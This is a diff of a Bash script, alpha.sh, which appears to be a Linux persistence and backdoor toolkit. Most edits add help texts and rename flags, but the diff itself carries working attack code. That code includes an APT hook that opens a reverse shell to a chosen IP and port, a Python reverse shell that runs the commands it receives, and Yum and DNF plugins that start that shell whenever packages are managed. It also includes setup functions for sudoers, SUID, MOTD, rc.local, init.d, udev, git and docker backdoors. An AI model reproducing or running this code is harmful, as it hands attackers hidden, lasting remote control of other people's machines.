 		if [[ -z $passwd_string ]]; then
 			echo "Error: --passwd-string must be specified with --custom."
+			echo "Try './alpha.sh --passwd-user --help' for more information."
 			exit 1
 		fi
 
@@ -1240,42 +1276,45 @@ setup_passwd_user() {
 		echo "[+] Custom passwd string added to /etc/passwd."
 	else
 		echo "Error: Either --default or --custom must be specified for --passwd-user."
+		echo "Try './alpha.sh --passwd-user --help' for more information."
 		exit 1
 	fi
 }
 
 setup_sudoers_backdoor() {
-	local default=0
 	local username=""
+
+	if ! check_root; then
+		echo "Error: This function can only be run as root."
+		exit 1
+	fi
+
+	usage_sudoers_backdoor() {
+		echo "Usage: ./alpha.sh --sudoers-backdoor [OPTIONS]"
+		echo "--username <username>      Specify the username"
+	}
 
 	while [[ "$1" != "" ]]; do
 		case $1 in
-			--default )
-				default=1
-				;;
 			--username )
 				shift
 				username=$1
 				;;
+			--help|-h)
+				usage_sudoers_backdoor
+				exit 0
+				;;
 			* )
 				echo "Invalid option for --sudoers-backdoor: $1"
+				echo "Try './alpha.sh --sudoers-backdoor --help' for more information."
 				exit 1
 		esac
 		shift
 	done
 
-	if [[ $default -eq 0 ]]; then
-		echo "Error: --default must be specified."
-		exit 1
-	fi
-
 	if [[ -z $username ]]; then
 		echo "Error: --username must be specified."
-		exit 1
-	fi
-
-	if ! check_root; then
-		echo "Error: This function can only be run as root."
+		echo "Try './alpha.sh --sudoers-backdoor --help' for more information."
 		exit 1
 	fi
 
@@ -1294,6 +1333,18 @@ setup_suid_backdoor() {
 	local custom=0
 	local binary=""
 
+	if ! check_root; then
+		echo "Error: This function can only be run as root."
+		exit 1
+	fi
+
+	usage_suid_backdoor() {
+		echo "Usage: ./alpha.sh --suid [OPTIONS]"
+		echo "--default                    Use default SUID settings"
+		echo "--custom                     Use custom SUID settings"
+		echo "  --binary <binary>            Specify the binary to give SUID permissions"
+	}
+
 	while [[ "$1" != "" ]]; do
 		case $1 in
 			--default )
@@ -1306,8 +1357,13 @@ setup_suid_backdoor() {
 				shift
 				binary=$1
 				;;
+			--help|-h)
+				usage_suid_backdoor
+				exit 0
+				;;
 			* )
-				echo "Invalid option for --suid-backdoor: $1"
+				echo "Invalid option for --suid: $1"
+				echo "Try './alpha.sh --suid --help' for more information."
 				exit 1
 		esac
 		shift
@@ -1315,16 +1371,13 @@ setup_suid_backdoor() {
 
 	if [[ $default -eq 1 && $custom -eq 1 ]]; then
 		echo "Error: --default and --custom cannot be specified together."
+		echo "Try './alpha.sh --suid --help' for more information."
 		exit 1
 	fi
 
 	if [[ $default -eq 0 && $custom -eq 0 ]]; then
 		echo "Error: Either --default or --custom must be specified."
-		exit 1
-	fi
-
-	if ! check_root; then
-		echo "Error: This function can only be run as root."
+		echo "Try './alpha.sh --suid --help' for more information."
 		exit 1
 	fi
 
@@ -1347,6 +1400,7 @@ setup_suid_backdoor() {
 	elif [[ $custom -eq 1 ]]; then
 		if [[ -z $binary ]]; then
 			echo "Error: --binary must be specified with --custom."
+			echo "Try './alpha.sh --suid --help' for more information."
 			exit 1
 		fi
 
@@ -1372,6 +1426,21 @@ setup_motd_backdoor() {
 	local command=""
 	local path=""
 
+	if ! check_root; then
+		echo "Error: This function can only be run as root."
+		exit 1
+	fi
+
+	usage_motd_backdoor() {
+		echo "Usage: ./alpha.sh --motd [OPTIONS]"
+		echo "--default                    Use default MOTD settings"
+		echo "  --ip <ip>                    Specify IP address"
+		echo "  --port <port>                Specify port number"
+		echo "--custom                     Use custom MOTD settings"
+		echo "  --command <command>          Specify custom command"
+		echo "  --path <path>                Specify custom MOTD file path in /etc/update-motd.d/"
+	}
+
 	while [[ "$1" != "" ]]; do
 		case $1 in
 			--default )
@@ -1396,8 +1465,13 @@ setup_motd_backdoor() {
 				shift
 				path=$1
 				;;
+			--help|-h)
+				usage_motd_backdoor
+				exit 0
+				;;
 			* )
 				echo "Invalid option for --motd-backdoor: $1"
+				echo "Try './alpha.sh --motd --help' for more information."
 				exit 1
 		esac
 		shift
@@ -1405,22 +1479,20 @@ setup_motd_backdoor() {
 
 	if [[ $default -eq 1 && $custom -eq 1 ]]; then
 		echo "Error: --default and --custom cannot be specified together."
+		echo "Try './alpha.sh --motd --help' for more information."
 		exit 1
 	fi
 
 	if [[ $default -eq 0 && $custom -eq 0 ]]; then
 		echo "Error: Either --default or --custom must be specified."
-		exit 1
-	fi
-
-	if ! check_root; then
-		echo "Error: This function can only be run as root."
+		echo "Try './alpha.sh --motd --help' for more information."
 		exit 1
 	fi
 
 	if [[ $default -eq 1 ]]; then
 		if [[ -z $ip || -z $port ]]; then
 			echo "Error: --ip and --port must be specified when using --default."
+			echo "Try './alpha.sh --motd --help' for more information."
 			exit 1
 		fi
 
@@ -1432,6 +1504,7 @@ setup_motd_backdoor() {
 	elif [[ $custom -eq 1 ]]; then
 		if [[ -z $command || -z $path ]]; then
 			echo "Error: --command and --path must be specified when using --custom."
+			echo "Try './alpha.sh --motd --help' for more information."
 			exit 1
 		fi
 
@@ -1453,6 +1526,20 @@ setup_rc_local_backdoor() {
 	local command=""
 	local rc_local_path="/etc/rc.local"
 
+	if ! check_root; then
+		echo "Error: This function can only be run as root."
+		exit 1
+	fi
+
+	usage_rc_local_backdoor() {
+		echo "Usage: ./alpha.sh --rc-local [OPTIONS]"
+		echo "--default                    Use default rc.local settings"
+		echo "  --ip <ip>                    Specify IP address"
+		echo "  --port <port>                Specify port number"
+		echo "--custom                     Use custom rc.local settings"
+		echo "  --command <command>          Specify custom command"
+	}
+
 	while [[ "$1" != "" ]]; do
 		case $1 in
 			--default )
@@ -1473,8 +1560,13 @@ setup_rc_local_backdoor() {
 				shift
 				command=$1
 				;;
+			--help|-h)
+				usage_rc_local_backdoor
+				exit 0
+				;;
 			* )
 				echo "Invalid option for --rc-local-backdoor: $1"
+				echo "Try './alpha.sh --rc-local --help' for more information."
 				exit 1
 		esac
 		shift
@@ -1482,22 +1574,20 @@ setup_rc_local_backdoor() {
 
 	if [[ $default -eq 1 && $custom -eq 1 ]]; then
 		echo "Error: --default and --custom cannot be specified together."
+		echo "Try './alpha.sh --rc-local --help' for more information."
 		exit 1
 	fi
 
 	if [[ $default -eq 0 && $custom -eq 0 ]]; then
 		echo "Error: Either --default or --custom must be specified."
-		exit 1
-	fi
-
-	if ! check_root; then
-		echo "Error: This function can only be run as root."
+		echo "Try './alpha.sh --rc-local --help' for more information."
 		exit 1
 	fi
 
 	if [[ $default -eq 1 ]]; then
 		if [[ -z $ip || -z $port ]]; then
 			echo "Error: --ip and --port must be specified when using --default."
+			echo "Try './alpha.sh --rc-local --help' for more information."
 			exit 1
 		fi
 
@@ -1513,6 +1603,7 @@ setup_rc_local_backdoor() {
 	elif [[ $custom -eq 1 ]]; then
 		if [[ -z $command ]]; then
 			echo "Error: --command must be specified when using --custom."
+			echo "Try './alpha.sh --rc-local --help' for more information."
 			exit 1
 		fi
 
@@ -1534,6 +1625,21 @@ setup_initd_backdoor() {
 	local port=""
 	local command=""
 	local initd_path="/etc/init.d/ssh-procps"
+
+	if ! check_root; then
+		echo "Error: This function can only be run as root."
+		exit 1
+	fi
+
+	usage_initd_backdoor() {
+		echo "Usage: ./alpha.sh --initd-backdoor [OPTIONS]"
+		echo "--default                    Use default init.d settings"
+		echo "  --ip <ip>                    Specify IP address"
+		echo "  --port <port>                Specify port number"
+		echo "--custom                     Use custom init.d settings"
+		echo "  --command <command>          Specify custom command"
+		echo "  --path <path>                Specify custom /etc/init.d/ file path"
+	}
 
 	while [[ "$1" != "" ]]; do
 		case $1 in
@@ -1559,8 +1665,13 @@ setup_initd_backdoor() {
 				shift
 				initd_path=$1
 				;;
+			--help|-h)
+				usage_initd_backdoor
+				exit 0
+				;;
 			* )
-				echo "Invalid option for --initd-backdoor: $1"
+				echo "Invalid option for --initd: $1"
+				echo "Try './alpha.sh --initd --help' for more information."
 				exit 1
 		esac
 		shift
@@ -1568,22 +1679,20 @@ setup_initd_backdoor() {
 
 	if [[ $default -eq 1 && $custom -eq 1 ]]; then
 		echo "Error: --default and --custom cannot be specified together."
+		echo "Try './alpha.sh --initd --help' for more information."
 		exit 1
 	fi
 
 	if [[ $default -eq 0 && $custom -eq 0 ]]; then
 		echo "Error: Either --default or --custom must be specified."
-		exit 1
-	fi
-
-	if ! check_root; then
-		echo "Error: This function can only be run as root."
+		echo "Try './alpha.sh --initd --help' for more information."
 		exit 1
 	fi
 
 	if [[ $default -eq 1 ]]; then
 		if [[ -z $ip || -z $port ]]; then
 			echo "Error: --ip and --port must be specified when using --default."
+			echo "Try './alpha.sh --initd --help' for more information."
 			exit 1
 		fi
 
@@ -1613,6 +1722,7 @@ setup_initd_backdoor() {
 	elif [[ $custom -eq 1 ]]; then
 		if [[ -z $command || -z $initd_path ]]; then
 			echo "Error: --command and --path must be specified when using --custom."
+			echo "Try './alpha.sh --initd --help' for more information."
 			exit 1
 		fi
 
@@ -1642,16 +1752,24 @@ setup_initd_backdoor() {
 }
 
 setup_package_manager_persistence() {
-    local default=0
     local ip=""
     local port=""
     local mechanism=""
 
+	if ! check_root; then
+		echo "Error: This function can only be run as root."
+		exit 1
+	fi
+
+	usage_package_manager_persistence() {
+		echo "Usage: ./alpha.sh --package-manager [OPTIONS]"
+		echo "  --ip <ip>                    Specify IP address"
+		echo "  --port <port>                Specify port number"
+		echo "  --apt | --yum | --dnf        Use APT, YUM or DNF package manager"
+	}
+
     while [[ "$1" != "" ]]; do
         case $1 in
-            --default )
-                default=1
-                ;;
             --ip )
                 shift
                 ip="$1"
@@ -1663,147 +1781,152 @@ setup_package_manager_persistence() {
             --apt | --dnf | --yum )
                 mechanism="$1"
                 ;;
+			--help|-h)
+				usage_package_manager_persistence
+				exit 0
+				;;
             * )
                 echo "Invalid option: $1"
+				echo "Try './alpha.sh --package-manager --help' for more information."
                 exit 1
         esac
         shift
     done
 
-    if [[ $default -eq 1 ]]; then
-        if [[ -z $ip || -z $port || -z $mechanism ]]; then
-            echo "Error: --default requires --ip, --port, and one of --apt, --yum, or --dnf."
-            exit 1
-        fi
+	if [[ -z $ip || -z $port || -z $mechanism ]]; then
+		echo "Error: --ip, --port, and one of --apt, --yum, or --dnf must be specified."
+		echo "Try './alpha.sh --package-manager --help' for more information."
+		exit 1
+	fi
 
-        local python_script=$(cat <<- EOF
-		#!/usr/bin/env python
-		HOST = "$ip"
-		PORT = $port
+	local python_script=$(cat <<- EOF
+	#!/usr/bin/env python
+	HOST = "$ip"
+	PORT = $port
 
-		def connect(host_port):
-		    import socket
-		    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		    s.connect(host_port)
-		    return s
+	def connect(host_port):
+		import socket
+		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		s.connect(host_port)
+		return s
 
-		def wait_for_command(s):
-		    import subprocess
-		    data = s.recv(1024)
-		    if data == "quit\n":
-		        s.close()
-		        sys.exit(0)
-		    elif len(data) == 0:
-		        return True
-		    else:
-		        proc = subprocess.Popen(data, shell=True,
-		                                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
-		                                stdin=subprocess.PIPE)
-		        stdout_value = proc.stdout.read() + proc.stderr.read()
-		        s.send(stdout_value)
-		        return False
+	def wait_for_command(s):
+		import subprocess
+		data = s.recv(1024)
+		if data == "quit\n":
+			s.close()
+			sys.exit(0)
+		elif len(data) == 0:
+			return True
+		else:
+			proc = subprocess.Popen(data, shell=True,
+									stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+									stdin=subprocess.PIPE)
+			stdout_value = proc.stdout.read() + proc.stderr.read()
+			s.send(stdout_value)
+			return False
 
-		def main():
-		    import sys, os, socket, time
-		    while True:
-		        socket_died = False
-		        try:
-		            s = connect((HOST, PORT))
-		            while not socket_died:
-		                socket_died = wait_for_command(s)
-		            s.close()
-		        except socket.error:
-		            pass
-		        time.sleep(5)
+	def main():
+		import sys, os, socket, time
+		while True:
+			socket_died = False
+			try:
+				s = connect((HOST, PORT))
+				while not socket_died:
+					socket_died = wait_for_command(s)
+				s.close()
+			except socket.error:
+				pass
+			time.sleep(5)
 
-		if __name__ == "__main__":
-		    main()
-		EOF
-		)
+	if __name__ == "__main__":
+		main()
+	EOF
+	)
 
-        case $mechanism in
-            --apt )
-                if [[ ! -x "$(command -v apt)" ]]; then
-                    echo "APT is not installed. Please install APT to use this option."
-                    exit 1
-                fi
+	case $mechanism in
+		--apt )
+			if [[ ! -x "$(command -v apt)" ]]; then
+				echo "APT is not installed. Please install APT to use this option."
+				echo "Try './alpha.sh --package-manager --help' for more information."
+				exit 1
+			fi
 
-                path="/etc/apt/apt.conf.d/01python-upgrades"
-                echo -e "APT::Update::Pre-Invoke {\"(nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' > /dev/null 2>&1 &) &\"};" > $path
-                echo "[+] APT persistence established"
-                ;;
-            --yum )
-                if [[ ! -x "$(command -v yum)" ]]; then
-                    echo "Yum is not installed. Please install Yum to use this option."
-                    exit 1
-                fi
+			path="/etc/apt/apt.conf.d/01python-upgrades"
+			echo -e "APT::Update::Pre-Invoke {\"(nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' > /dev/null 2>&1 &) &\"};" > $path
+			echo "[+] APT persistence established"
+			;;
+		--yum )
+			if [[ ! -x "$(command -v yum)" ]]; then
+				echo "Yum is not installed. Please install Yum to use this option."
+				echo "Try './alpha.sh --package-manager --help' for more information."
+				exit 1
+			fi
 
-                if [[ -x "$(command -v dnf)" && "$(readlink -f "$(which yum)")" == "$(which dnf)" ]]; then
-                    echo "Yum is symlinked to DNF. Please use --dnf option."
-                    exit 1
-                fi
+			if [[ -x "$(command -v dnf)" && "$(readlink -f "$(which yum)")" == "$(which dnf)" ]]; then
+				echo "Yum is symlinked to DNF. Please use --dnf option."
+				echo "Try './alpha.sh --package-manager --help' for more information."
+				exit 1
+			fi
 
-                echo "$python_script" > /usr/lib/yumcon
-                chmod +x /usr/lib/yumcon
+			echo "$python_script" > /usr/lib/yumcon
+			chmod +x /usr/lib/yumcon
 
-                echo -e "[main]\nenabled=1" > /etc/yum/pluginconf.d/yumcon.conf
+			echo -e "[main]\nenabled=1" > /etc/yum/pluginconf.d/yumcon.conf
 
-                cat <<- 'EOF' > /usr/lib/yum-plugins/yumcon.py
-				import os
+			cat <<- 'EOF' > /usr/lib/yum-plugins/yumcon.py
+			import os
 
-				try:
-				    from yum.plugins import TYPE_INTERACTIVE, PluginYumExit
-				    requires_api_version = '2.0'
-				    plugin_type = TYPE_INTERACTIVE
-				except ImportError:
-				    requires_api_version = '1.0'
+			try:
+				from yum.plugins import TYPE_INTERACTIVE, PluginYumExit
+				requires_api_version = '2.0'
+				plugin_type = TYPE_INTERACTIVE
+			except ImportError:
+				requires_api_version = '1.0'
 
-				def pretrans_hook(conduit):
-				    os.system('setsid /usr/lib/yumcon 2>/dev/null & ')
-				EOF
-                echo "[+] Yum persistence established"
-                ;;
-            --dnf )
-                if [[ ! -x "$(command -v dnf)" ]]; then
-                    echo "DNF is not installed. Please install DNF to use this option."
-                    exit 1
-                fi
+			def pretrans_hook(conduit):
+				os.system('setsid /usr/lib/yumcon 2>/dev/null & ')
+			EOF
+			echo "[+] Yum persistence established"
+			;;
+		--dnf )
+			if [[ ! -x "$(command -v dnf)" ]]; then
+				echo "DNF is not installed. Please install DNF to use this option."
+				echo "Try './alpha.sh --package-manager --help' for more information."
+				exit 1
+			fi
 
-                python_version=$(ls /usr/lib | grep -oP 'python3\.\d+' | head -n 1)
-                python_path=$(which python)
+			python_version=$(ls /usr/lib | grep -oP 'python3\.\d+' | head -n 1)
+			python_path=$(which python)
 
-                echo "$python_script" > /usr/lib/$python_version/site-packages/dnfcon
-                chmod +x /usr/lib/$python_version/site-packages/dnfcon
+			echo "$python_script" > /usr/lib/$python_version/site-packages/dnfcon
+			chmod +x /usr/lib/$python_version/site-packages/dnfcon
 
-                echo -e "[main]\nenabled=1" > /etc/dnf/plugins/dnfcon.conf
+			echo -e "[main]\nenabled=1" > /etc/dnf/plugins/dnfcon.conf
 
-                cat <<- EOF > /usr/lib/$python_version/site-packages/dnf-plugins/dnfcon.py
-				import dnf
-				import os
+			cat <<- EOF > /usr/lib/$python_version/site-packages/dnf-plugins/dnfcon.py
+			import dnf
+			import os
 
-				def execute_dnfcon():
-				    os.system('setsid /usr/lib/$python_version/site-packages/dnfcon 2>/dev/null &')
+			def execute_dnfcon():
+				os.system('setsid /usr/lib/$python_version/site-packages/dnfcon 2>/dev/null &')
 
-				class BackdoorPlugin(dnf.Plugin):
-				    name = 'dnfcon'
+			class BackdoorPlugin(dnf.Plugin):
+				name = 'dnfcon'
 
-				    def __init__(self, base, cli):
-				        super(BackdoorPlugin, self).__init__(base, cli)
-				        execute_dnfcon()
+				def __init__(self, base, cli):
+					super(BackdoorPlugin, self).__init__(base, cli)
+					execute_dnfcon()
 
-				def __init__(self, base, conf, **kwargs):
-				    dnf.Plugin.__init__(self, base, conf, **kwargs)
-				    execute_dnfcon()
+			def __init__(self, base, conf, **kwargs):
+				dnf.Plugin.__init__(self, base, conf, **kwargs)
+				execute_dnfcon()
 
-				plugin = BackdoorPlugin
-				EOF
-                echo "[+] DNF persistence established"
-                ;;
-        esac
-    else
-        echo "Error: --default must be specified."
-        exit 1
-    fi
+			plugin = BackdoorPlugin
+			EOF
+			echo "[+] DNF persistence established"
+			;;
+	esac
 }
 
 setup_cap_backdoor() {
@@ -1811,6 +1934,19 @@ setup_cap_backdoor() {
 	local custom=0
 	local capability=""
 	local binary=""
+
+	if ! check_root; then
+		echo "Error: This function can only be run as root."
+		exit 1
+	fi
+
+	usage_cap_backdoor() {
+		echo "Usage: ./alpha.sh --cap [OPTIONS]"
+		echo "--default                    Use default capabilities settings"
+		echo "--custom                     Use custom capabilities settings"
+		echo "  --capability <capability>    Specify the capability"
+		echo "  --binary <binary>            Specify the path to the binary"
+	}
 
 	while [[ "$1" != "" ]]; do
 		case $1 in
@@ -1828,8 +1964,13 @@ setup_cap_backdoor() {
 				shift
 				binary=$1
 				;;
+			--help|-h)
+				usage_cap_backdoor
+				exit 0
+				;;
 			* )
-				echo "Invalid option for --cap-backdoor: $1"
+				echo "Invalid option for --cap: $1"
+				echo "Try './alpha.sh --cap --help' for more information."
 				exit 1
 		esac
 		shift
@@ -1837,16 +1978,13 @@ setup_cap_backdoor() {
 
 	if [[ $default -eq 1 && $custom -eq 1 ]]; then
 		echo "Error: --default and --custom cannot be specified together."
+		echo "Try './alpha.sh --cap --help' for more information."
 		exit 1
 	fi
 
 	if [[ $default -eq 0 && $custom -eq 0 ]]; then
 		echo "Error: Either --default or --custom must be specified."
-		exit 1
-	fi
-
-	if ! check_root; then
-		echo "Error: This function can only be run as root."
+		echo "Try './alpha.sh --cap --help' for more information."
 		exit 1
 	fi
 
@@ -1868,6 +2006,7 @@ setup_cap_backdoor() {
 	elif [[ $custom -eq 1 ]]; then
 		if [[ -z $capability || -z $binary ]]; then
 			echo "Error: --capability and --binary must be specified with --custom."
+			echo "Try './alpha.sh --cap --help' for more information."
 			exit 1
 		fi
 
@@ -1891,6 +2030,14 @@ setup_bind_shell() {
 	local architecture=""
 	local binary=""
 
+	usage_bind_shell() {
+		echo "Usage: ./alpha.sh --bind-shell [OPTIONS]"
+		echo "--default                    Use default bind shell settings"
+		echo "  --architecture <arch>        Specify architecture (x86 or x64)"
+		echo "--custom                     Use custom bind shell binary"
+		echo "  --binary <binary>            Specify the path to the custom binary"
+	}
+
 	while [[ "$1" != "" ]]; do
 		case $1 in
 			--default )
@@ -1907,8 +2054,13 @@ setup_bind_shell() {
 				shift
 				binary=$1
 				;;
+            --help|-h)
+                usage_bind_shell
+                exit 0
+                ;;
 			* )
 				echo "Invalid option for --bind-shell: $1"
+				echo "Try './alpha.sh --bind-shell --help' for more information."
 				exit 1
 		esac
 		shift
@@ -1916,12 +2068,14 @@ setup_bind_shell() {
 
 	if [[ $default -eq 1 && $custom -eq 1 ]]; then
 		echo "Error: --default and --custom cannot be specified together."
+		echo "Try './alpha.sh --bind-shell --help' for more information."
 		exit 1
 	fi
 
 	if [[ $default -eq 1 ]]; then
 		if [[ -z $architecture ]]; then
 			echo "Error: --architecture (x64/x86) must be specified when using --default."
+			echo "Try './alpha.sh --bind-shell --help' for more information."
 			exit 1
 		fi
 
@@ -1940,6 +2094,7 @@ setup_bind_shell() {
 				;;
 			* )
 				echo "Error: Invalid architecture specified. Use one of x86 or x64"
+				echo "Try './alpha.sh --bind-shell --help' for more information."
 				exit 1
 		esac
 
@@ -1949,11 +2104,13 @@ setup_bind_shell() {
 	elif [[ $custom -eq 1 ]]; then
 		if [[ -z $binary ]]; then
 			echo "Error: --binary must be specified when using --custom."
+			echo "Try './alpha.sh --bind-shell --help' for more information."
 			exit 1
 		fi
 
 		if [[ ! -f $binary ]]; then
 			echo "Error: Specified binary does not exist: $binary"
+			echo "Try './alpha.sh --bind-shell --help' for more information."
 			exit 1
 		fi
 
@@ -1963,6 +2120,7 @@ setup_bind_shell() {
 
 	else
 		echo "Error: Either --default or --custom must be specified for --bind-shell."
+		echo "Try './alpha.sh --bind-shell --help' for more information."
 		exit 1
 	fi
 }
@@ -1975,6 +2133,22 @@ setup_system_binary_backdoor() {
 	local port=""
 	local binary=""
 	local command=""
+
+	if ! check_root; then
+		echo "Error: This function can only be run as root."
+		exit 1
+	fi
+
+	usage_system_binary_backdoor() {
+		echo "Usage: ./alpha.sh --system-binary [OPTIONS]"
+		echo "--default                    Use default system binary backdoor settings"
+		echo "  --ip <ip>                    Specify IP address"
+		echo "  --port <port>                Specify port number"
+		echo "--custom                     Use custom system binary backdoor settings"
+		echo "  --binary <binary>            Specify the binary to backdoor"
+		echo "  --command <command>          Specify the custom command to execute"
+		echo "  --warning                    This may interrupt your system.. Be careful!"
+	}
 
 	while [[ "$1" != "" ]]; do
 		case $1 in
@@ -2003,8 +2177,13 @@ setup_system_binary_backdoor() {
 				shift
 				command=$1
 				;;
+			--help|-h)
+				usage_system_binary_backdoor
+				exit 0
+				;;
 			* )
 				echo "Invalid option for --system-binary-backdoor: $1"
+				echo "Try './alpha.sh --system-binary --help' for more information."
 				exit 1
 		esac
 		shift
@@ -2012,22 +2191,20 @@ setup_system_binary_backdoor() {
 
 	if [[ $default -eq 1 && $custom -eq 1 ]]; then
 		echo "Error: --default and --custom cannot be specified together."
+		echo "Try './alpha.sh --system-binary --help' for more information."
 		exit 1
 	fi
 
 	if [[ $default -eq 0 && $custom -eq 0 ]]; then
 		echo "Error: Either --default or --custom must be specified."
-		exit 1
-	fi
-
-	if ! check_root; then
-		echo "Error: This function can only be run as root."
+		echo "Try './alpha.sh --system-binary --help' for more information."
 		exit 1
 	fi
 
 	if [[ $default -eq 1 ]]; then
 		if [[ -z $ip || -z $port ]]; then
 			echo "Error: --ip and --port must be specified when using --default."
+			echo "Try './alpha.sh --system-binary --help' for more information."
 			exit 1
 		fi
 
@@ -2048,6 +2225,7 @@ setup_system_binary_backdoor() {
 	elif [[ $custom -eq 1 ]]; then
 		if [[ -z $binary || -z $command ]]; then
 			echo "Error: --binary and --command must be specified when using --custom."
+			echo "Try './alpha.sh --system-binary --help' for more information."
 			exit 1
 		fi
 
@@ -2055,6 +2233,7 @@ setup_system_binary_backdoor() {
 			echo "Error: --warning must be specified when using --custom."
 			echo "Warning: this will overwrite the original binary with the backdoored version."
 			echo "You better know what you are doing with that custom command!"
+			echo "Try './alpha.sh --system-binary --help' for more information."
 			exit 1
 		fi
 
@@ -2078,6 +2257,22 @@ setup_udev() {
 	local custom=0
 	local command=""
 	local path=""
+
+	if ! check_root; then
+		echo "Error: This function can only be run as root."
+		exit 1
+	fi
+
+	usage_udev() {
+		echo "Usage: ./alpha.sh --udev [OPTIONS]"
+		echo "--default                    Use default udev settings"
+		echo "  --ip <ip>                    Specify IP address"
+		echo "  --port <port>                Specify port number"
+		echo "  --at | --cron | --systemd    Specify the mechanism to use"
+		echo "--custom                     Use custom udev settings"
+		echo "  --command <command>          Specify custom command"
+		echo "  --path <path>                Specify custom path"
+	}
 
 	while [[ "$1" != "" ]]; do
 		case $1 in
@@ -2106,8 +2301,13 @@ setup_udev() {
 				shift
 				path="$1"
 				;;
+			--help|-h)
+				usage_udev
+				exit 0
+				;;
 			* )
 				echo "Invalid option: $1"
+				echo "Try './alpha.sh --udev --help' for more information."
 				exit 1
 		esac
 		shift
@@ -2116,10 +2316,12 @@ setup_udev() {
 	if [[ $default -eq 1 ]]; then
 		if [[ -z $ip || -z $port ]]; then
 			echo "Error: --default requires --ip and --port."
+			echo "Try './alpha.sh --udev --help' for more information."
 			exit 1
 		fi
 		if [[ -z $mechanism ]]; then
 			echo "Error: --default requires --at, --cron, or --systemd."
+			echo "Try './alpha.sh --udev --help' for more information."
 			exit 1
 		fi
 
@@ -2188,6 +2390,7 @@ setup_udev() {
 	elif [[ $custom -eq 1 ]]; then
 		if [[ -z $command || -z $path ]]; then
 			echo "Error: --custom requires --command and --path."
+			echo "Try './alpha.sh --udev --help' for more information."
 			exit 1
 		fi
 
@@ -2196,6 +2399,7 @@ setup_udev() {
 
 	else
 		echo "Error: Either --default or --custom must be specified for --udev."
+		echo "Try './alpha.sh --udev --help' for more information."
 		exit 1
 	fi
 
@@ -2214,6 +2418,20 @@ setup_git_persistence() {
     local pager=0
     local path=""
     local command=""
+
+	usage_git() {
+		echo "Usage: ./alpha.sh --git [OPTIONS]"
+		echo "--default                    Use default bind shell settings"
+		echo "  --ip <ip>                    Specify IP address"
+		echo "  --port <port>                Specify port number"
+		echo "  --hook                       Establish Persistence through a Git Hook"
+		echo "  --pager                      Establish Persistence through Git Pager"
+		echo "--custom 				       Use custom Git settings"
+		echo "  --command <command>          Specify custom persistence command"
+		echo "  --path <path>                Specify custom path"
+		echo "  --hook                       Establish Persistence through a Git Hook"
+		echo "  --pager                      Establish Persistence through Git Pager"
+	}
 
     while [[ "$1" != "" ]]; do
         case $1 in
@@ -2245,8 +2463,13 @@ setup_git_persistence() {
                 shift
                 command=$1
                 ;;
+            --help|-h)
+                usage_git
+                exit 0
+                ;;
             * )
-                echo "Invalid option for --git-persistence: $1"
+                echo "Invalid option for --git: $1"
+				echo "Try './alpha.sh --git --help' for more information."
                 exit 1
         esac
         shift
@@ -2254,17 +2477,20 @@ setup_git_persistence() {
 
     if [[ $default -eq 0 && $custom -eq 0 ]]; then
         echo "Error: --default or --custom must be specified."
+		echo "Try './alpha.sh --git --help' for more information."
         exit 1
     fi
 
     if [[ $default -eq 1 ]]; then
         if [[ -z $ip || -z $port ]]; then
             echo "Error: --ip and --port must be specified when using --default."
+			echo "Try './alpha.sh --git --help' for more information."
             exit 1
         fi
 
         if [[ $hook -eq 0 && $pager -eq 0 ]]; then
             echo "Error: Either --hook or --pager must be specified with --default."
+			echo "Try './alpha.sh --git --help' for more information."
             exit 1
         fi
     fi
@@ -2272,11 +2498,13 @@ setup_git_persistence() {
     if [[ $custom -eq 1 ]]; then
         if [[ -z $path || -z $command ]]; then
             echo "Error: --path and --command must be specified when using --custom."
+			echo "Try './alpha.sh --git --help' for more information."
             exit 1
         fi
 
         if [[ $hook -eq 0 && $pager -eq 0 ]]; then
             echo "Error: Either --hook or --pager must be specified with --custom."
+			echo "Try './alpha.sh --git --help' for more information."
             exit 1
         fi
     fi
@@ -2398,15 +2626,22 @@ setup_git_persistence() {
 }
 
 setup_malicious_docker_container() {
-    local default=0
     local ip=""
     local port=""
 
+    if ! check_root; then
+        echo "Error: This function can only be run as root."
+        exit 1
+    fi
+
+	usage_malicious_docker_container() {
+		echo "Usage: ./alpha.sh --docker-container [OPTIONS]"
+		echo "--ip <ip>                    Specify IP address"
+		echo "--port <port>                Specify port number"
+	}
+
     while [[ "$1" != "" ]]; do
         case $1 in
-            --default )
-                default=1
-                ;;
             --ip )
                 shift
                 ip=$1
@@ -2415,25 +2650,21 @@ setup_malicious_docker_container() {
                 shift
                 port=$1
                 ;;
+			--help|-h)
+				usage_malicious_docker_container
+				exit 0
+				;;
             * )
-                echo "Invalid option for --generator-persistence: $1"
+                echo "Invalid option for --docker-container: $1"
+				echo "Try './alpha.sh --docker-container --help' for more information."
                 exit 1
         esac
         shift
     done
 
-    if [[ $default -eq 0 ]]; then
-        echo "Error: --default must be specified."
-        exit 1
-    fi
-
     if [[ -z $ip || -z $port ]]; then
         echo "Error: --ip and --port must be specified."
-        exit 1
-    fi
-
-    if ! check_root; then
-        echo "Error: This function can only be run as root."
+		echo "Try './alpha.sh --docker-container --help' for more information."
         exit 1
     fi
 
@@ -2488,20 +2719,6 @@ main() {
 		exit 0
 	fi
 
-	for arg in "$@"; do
-		if [[ "$arg" == "-h" || "$arg" == "--help" ]]; then
-			if [[ $QUIET -ne 1 ]]; then
-				print_banner
-			fi
-			if check_root; then
-				usage_root
-			else
-				usage_user
-			fi
-			exit 0
-		fi
-	done
-
 	# Parse command line arguments
 	while [[ "$1" != "" ]]; do
 		case $1 in
@@ -2521,7 +2738,7 @@ main() {
 				setup_systemd "$@"
 				exit
 				;;
-			--generator-persistence )
+			--generator )
 				shift
 				setup_generator_persistence "$@"
 				exit
@@ -2546,7 +2763,7 @@ main() {
 				setup_authorized_keys "$@"
 				exit
 				;;
-			--shell-configuration )
+			--shell-profile )
 				shift
 				setup_shell_profile "$@"
 				exit
@@ -2576,37 +2793,37 @@ main() {
 				setup_passwd_user "$@"
 				exit
 				;;
-			--sudoers-backdoor )
+			--sudoers )
 				shift
 				setup_sudoers_backdoor "$@"
 				exit
 				;;
-			--suid-backdoor )
+			--suid )
 				shift
 				setup_suid_backdoor "$@"
 				exit
 				;;
-			--motd-backdoor )
+			--motd )
 				shift
 				setup_motd_backdoor "$@"
 				exit
 				;;
